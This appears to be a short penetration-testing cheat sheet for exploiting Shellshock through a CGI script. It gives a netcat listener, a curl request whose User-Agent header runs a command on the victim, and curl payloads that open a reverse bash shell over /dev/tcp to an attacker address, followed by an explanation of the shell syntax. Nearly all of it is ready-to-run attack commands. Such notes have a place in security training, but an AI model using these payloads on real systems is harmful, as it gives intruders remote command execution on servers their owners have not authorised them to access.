## Example

Assumptions:
`443 (attacker listening port)`

```
#Attacker Machine (Listening)
nc -lvnp 443
listening on [any] 443 ...
```

Test:
```
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://$VICTIM_IP/cgi-bin/test.sh
```
This should show group permissions
e.g:
```
uid=1000(nullbr41n) gid=1000(nullbr41n) groups=1000(nullbr41n)
```


```
VICTIM_IP=xx.x.x.x
ATTACKER_IP=xxx.xx.x.xx
curl --user-agent "() { ignored;}; /bin/bash -i >& /dev/tcp/$ATTACKER_IP/443 0>&1" http://$VICTIM_IP/cgi-bin/test.sh
```

#### Explanation
```
curl <options> Web-URL

Now lets explore Options used.

--user-agent: <bash function>

	() { ignored;}: function ignored
	/bin/bash -i : Intractive shell
	>&           : Redirecting Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word.
	(expansion of word being /dev/tcp/$ATTACKER_IP/443)

	/dev/tcp/$ATTACKER_IP/443: Pipe that shell & redirection of fd 0/1/2 to the attacker (who has a netcat listener running).

	0>&1         : take stdIn and connect it to std Out
```


TIPS:
```
 - circumventing other shell
 /bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/443'
```